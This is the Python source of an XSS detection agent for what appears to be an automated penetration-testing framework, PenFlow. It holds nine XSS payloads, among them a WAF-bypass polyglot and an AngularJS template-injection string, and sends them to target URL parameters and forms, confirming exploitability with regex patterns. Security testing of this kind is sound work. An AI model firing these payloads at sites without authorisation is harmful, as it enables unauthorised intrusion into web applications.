"""
XSSCapabilityAgent — Reflected & Stored XSS Detection for PenFlow.

Tests all discovered form parameters and URL query parameters for:
  1. Reflected XSS — payload echoed verbatim in HTML response
  2. Attribute injection XSS — payload reflected inside HTML attribute context
  3. JavaScript context injection — payload reflected inside <script> blocks
  4. Polyglot XSS bypasses — WAF evasion payloads

Detection is context-aware: identifies HTML context of reflection (tag body,
attribute value, JS string) before confirming exploitability.
"""
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.capabilities.result import AgentExecutionResult
from penflow.testing.payload_engine import PayloadTemplateEngine
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.xss")

# ─────────────────────────────────────────────────────────
# XSS Payload Suite — Classic, Attribute, JS-Context, Polyglots
# ─────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    # Classic reflected XSS probes
    {
        "name": "xss_classic_script_tag",
        "payload": "<script>alert('XSS_PenFlow_001')</script>",
        "marker": "XSS_PenFlow_001",
        "context": "html_body",
        "description": "Classic <script> tag injection",
        "severity": "high",
    },
    {
        "name": "xss_img_onerror",
        "payload": '"><img src=x onerror=alert(\'XSS_PenFlow_002\')>',
        "marker": "XSS_PenFlow_002",
        "context": "attribute_breakout",
        "description": "Attribute context breakout with img onerror",
        "severity": "high",
    },
    {
        "name": "xss_svg_onload",
        "payload": "<svg/onload=alert('XSS_PenFlow_003')>",
        "marker": "XSS_PenFlow_003",
        "context": "html_body",
        "description": "SVG onload event handler",
        "severity": "high",
    },
    {
        "name": "xss_event_attribute",
        "payload": "' onmouseover='alert(\"XSS_PenFlow_004\")'",
        "marker": "XSS_PenFlow_004",
        "context": "attribute_value",
        "description": "Event attribute injection via single-quote breakout",
        "severity": "high",
    },
    {
        "name": "xss_javascript_href",
        "payload": "javascript:alert('XSS_PenFlow_005')",
        "marker": "XSS_PenFlow_005",
        "context": "href_attribute",
        "description": "javascript: URI in href/action attributes",
        "severity": "medium",
    },
    # WAF bypass / polyglot payloads
    {
        "name": "xss_polyglot_1",
        "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS_PenFlow_006') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS_PenFlow_006')//>>",
        "marker": "XSS_PenFlow_006",
        "context": "polyglot",
        "description": "Multi-context XSS polyglot (WAF bypass)",
        "severity": "critical",
    },
    {
        "name": "xss_template_injection_bridge",
        "payload": "{{constructor.constructor('alert(\"XSS_PenFlow_007\")')()}}",
        "marker": "XSS_PenFlow_007",
        "context": "angular_template",
        "description": "AngularJS template injection bridge to XSS",
        "severity": "high",
    },
    {
        "name": "xss_script_src_bypass",
        "payload": "</script><script>alert('XSS_PenFlow_008')</script>",
        "marker": "XSS_PenFlow_008",
        "context": "js_string_breakout",
        "description": "Script tag close + new tag injection (JS string breakout)",
        "severity": "high",
    },
    # Stored XSS probe (for POST forms)
    {
        "name": "xss_stored_probe",
        "payload": "<img src='x' onerror='alert(\"XSS_PenFlow_009\")' style='display:none'>",
        "marker": "XSS_PenFlow_009",
        "context": "stored_form",
        "description": "Stored XSS probe via POST form submission",
        "severity": "critical",
    },
]

# HTML contexts that confirm exploitability when payload is reflected
EXPLOITABLE_REFLECTION_PATTERNS = [
    r"<script[^>]*>alert\(['\"]XSS_PenFlow",  # inside script tag
    r"onerror\s*=\s*alert\(['\"]XSS_PenFlow",  # in event handler
    r"onload\s*=\s*alert\(['\"]XSS_PenFlow",  # in event handler
    r"onmouseover\s*=\s*alert\(['\"]XSS_PenFlow",  # in event handler
    r"<svg[^>]*/onload",  # SVG onload
    r"javascript:alert\(['\"]XSS_PenFlow",  # javascript: URI
]


class XSSCapabilityAgent(BaseCapabilityAgent):
    """
    Reflected & Stored XSS Specialist Capability Agent.
    Tests all URL query parameters and form fields with 9 XSS payloads
    including WAF-bypass polyglots and AngularJS template injection bridges.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="XSSCapabilityAgent", priority=priority)
        self.payload_engine = PayloadTemplateEngine()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="reflected_xss",
                name="Reflected XSS Parameter Injection",
                description=(
                    "Tests all URL query parameters for reflected XSS with classic, "
                    "attribute-breakout, SVG, polyglot, and AngularJS template payloads."
                ),
                priority=self.priority,
                tags=["xss", "reflected", "injection", "client-side"],
            ),
            Capability(
                id="stored_xss",
                name="Stored XSS via POST Form Submission",
                description=(
                    "Injects XSS payloads into all discovered form fields via POST requests "
                    "and verifies persistence in subsequent GET responses."
                ),
                priority=self.priority,
                tags=["xss", "stored", "persistent", "form"],
            ),
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[XSSCapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        deep_mode = (context.shared_cache or {}).get("deep_mode", False)

        findings: List[Dict[str, Any]] = []
        payloads_to_test = XSS_PAYLOADS if deep_mode else XSS_PAYLOADS[:5]

        if capability_id == "reflected_xss":
            # Collect all parameterized endpoints from observations
            param_endpoints = self._collect_param_endpoints(context)

            for endpoint in param_endpoints[:15]:
                for xss_payload in payloads_to_test:
                    finding = await self._test_reflected_xss(
                        http_client, endpoint, xss_payload
                    )
                    if finding:
                        findings.append(finding)
                        if finding.get("is_vulnerable"):
                            break  # stop at first confirmed XSS per endpoint

        elif capability_id == "stored_xss":
            # Collect discovered forms
            form_endpoints = self._collect_forms(context)
            for form in form_endpoints[:8]:
                for xss_payload in [p for p in payloads_to_test if p["context"] == "stored_form"]:
                    finding = await self._test_stored_xss(http_client, form, xss_payload, context)
                    if finding:
                        findings.append(finding)

        confirmed = [f for f in findings if f.get("is_vulnerable")]
        is_vuln = len(confirmed) > 0
        best = confirmed[0] if confirmed else (findings[0] if findings else {})

        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vuln,
            confidence_score=best.get("confidence", 0.0),
            reasoning=best.get("reasoning", "No XSS reflection detected or all payloads encoded/rejected."),
            target_url=best.get("tested_url", f"https://{context.asset}"),
            findings=findings,
            evidence={
                "target_url": best.get("tested_url", f"https://{context.asset}"),
                "reasoning": best.get("reasoning", "No XSS reflection detected or all payloads encoded/rejected."),
                "payload_used": best.get("payload_name", ""),
                "reflection_context": best.get("context", ""),
                "findings": findings,
                "evidence_exchanges": [f.get("exchange", {}) for f in findings if f.get("exchange")],
            },
        ).to_dict()

    def _collect_param_endpoints(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        """Extract all URL-parameterized endpoints from observations."""
        targets = []
        seen = set()

        for obs in context.observations:
            data = obs.get("data", {}) if isinstance(obs, dict) else {}
            if not isinstance(data, dict):
                continue

            for ep in data.get("endpoints", []):
                if not isinstance(ep, dict):
                    continue
                url = ep.get("url", "")
                params = ep.get("parameters", [])
                if url and params and url not in seen:
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query)
                    if qs:
                        targets.append({"url": url, "params": list(qs.keys())})
                        seen.add(url)

            # From classified endpoint with parameters
            if data.get("parameters") and data.get("url"):
                url = data["url"]
                if url not in seen:
                    targets.append({"url": url, "params": data["parameters"]})
                    seen.add(url)

        # Fallback: generate test URLs with common XSS-testable params
        if not targets:
            base = f"https://{context.asset}"
            for param in ["q", "search", "query", "name", "message", "comment", "input"]:
                targets.append({
                    "url": f"{base}/search?{param}=penflow_test",
                    "params": [param]
                })
        return targets

    def _collect_forms(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        """Extract all discovered forms from crawl observations."""
        forms = []
        for obs in context.observations:
            data = obs.get("data", {}) if isinstance(obs, dict) else {}
            if isinstance(data, dict):
                for form in data.get("forms", []):
                    if isinstance(form, dict) and form.get("action") and form.get("parameters"):
                        forms.append(form)
        return forms

    async def _test_reflected_xss(
        self,
        http_client: Any,
        endpoint: Dict[str, Any],
        xss_payload: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:
        """Inject a single XSS payload into a URL parameter and check for reflection."""
        base_url = endpoint["url"]
        param_name = endpoint["params"][0]
        payload_str = xss_payload["payload"]
        marker = xss_payload["marker"]

        # Build injected URL
        parsed = urlparse(base_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param_name] = [payload_str]
        injected_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

        try:
            exchange = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="GET",
                url=injected_url,
            )
        except Exception as e:
            logger.debug(f"[XSSCapabilityAgent] Failed to test {injected_url}: {e}")
            return None

        resp = exchange.response
        if not resp:
            return None

        status = resp.status_code
        body = resp.body_text or ""
        content_type = ""
        if hasattr(resp, "headers"):
            ct = resp.headers if isinstance(resp.headers, dict) else {}
            content_type = ct.get("content-type", "") or ct.get("Content-Type", "")

        # Check if payload marker reflects in response body
        marker_reflected = marker in body

        # Check for exploitable reflection (unencoded execution context)
        is_exploitable = False
        matched_pattern = ""
        import re
        for pattern in EXPLOITABLE_REFLECTION_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                is_exploitable = True
                matched_pattern = pattern
                break

        # If marker reflects but HTML-encoded, note as low-confidence
        html_encoded_marker = marker.replace("<", "&lt;").replace(">", "&gt;")
        is_encoded = html_encoded_marker in body and not marker_reflected

        is_vuln = marker_reflected and is_exploitable
        confidence = 0.0
        reasoning = ""

        if is_vuln:
            confidence = 0.95
            reasoning = (
                f"CONFIRMED Reflected XSS: Payload '{xss_payload['name']}' "
                f"reflected in {xss_payload['context']} context (unencoded, exploitable). "
                f"Execution pattern matched: {matched_pattern}"
            )
        elif marker_reflected and not is_exploitable:
            confidence = 0.45
            reasoning = (
                f"Weak XSS Signal: Payload marker reflected verbatim but in a "
                f"non-exploitable context (no event handler/script execution pattern). "
                f"Manual review needed."
            )
        elif is_encoded:
            confidence = 0.0
            reasoning = f"HTML encoding applied — payload '{xss_payload['name']}' safely encoded by server."
        else:
            reasoning = f"Payload '{xss_payload['name']}' not reflected in HTTP {status} response."

        return {
            "tested_url": injected_url,
            "payload_name": xss_payload["name"],
            "payload_description": xss_payload["description"],
            "param_injected": param_name,
            "context": xss_payload["context"],
            "is_vulnerable": is_vuln,
            "confidence": confidence,
            "marker_reflected": marker_reflected,
            "is_exploitable": is_exploitable,
            "is_encoded": is_encoded,
            "status_code": status,
            "reasoning": reasoning,
            "exchange": exchange.to_dict() if exchange else {},
        }

    async def _test_stored_xss(
        self,
        http_client: Any,
        form: Dict[str, Any],
        xss_payload: Dict[str, Any],
        context: CapabilityExecutionContext,
    ) -> Optional[Dict[str, Any]]:
        """Submit XSS payload via POST form, then GET the same/related page to check persistence."""
        action_url = form.get("action", "")
        params = form.get("parameters", [])
        payload_str = xss_payload["payload"]
        marker = xss_payload["marker"]

        if not action_url or not params:
            return None

        # Build POST body with XSS in all fields
        post_data = {p: payload_str for p in params}

        try:
            post_exch = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="POST",
                url=action_url,
                json_data=post_data,
            )
            # Re-fetch the same URL to check persistence
            get_exch = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="GET",
                url=action_url,
            )
        except Exception as e:
            logger.debug(f"[XSSCapabilityAgent] Stored XSS test failed for {action_url}: {e}")
            return None

        resp = get_exch.response
        body = (resp.body_text or "") if resp else ""
        marker_in_get = marker in body

        is_vuln = marker_in_get
        confidence = 0.90 if is_vuln else 0.0
        reasoning = (
            f"CRITICAL Stored XSS: Payload '{xss_payload['name']}' persisted after POST "
            f"and was reflected in subsequent GET to {action_url}."
            if is_vuln else
            f"Payload '{xss_payload['name']}' not persisted after POST to {action_url}."
        )

        return {
            "tested_url": action_url,
            "payload_name": xss_payload["name"],
            "payload_description": xss_payload["description"],
            "is_vulnerable": is_vuln,
            "confidence": confidence,
            "reasoning": reasoning,
            "exchange": post_exch.to_dict() if post_exch else {},
        }
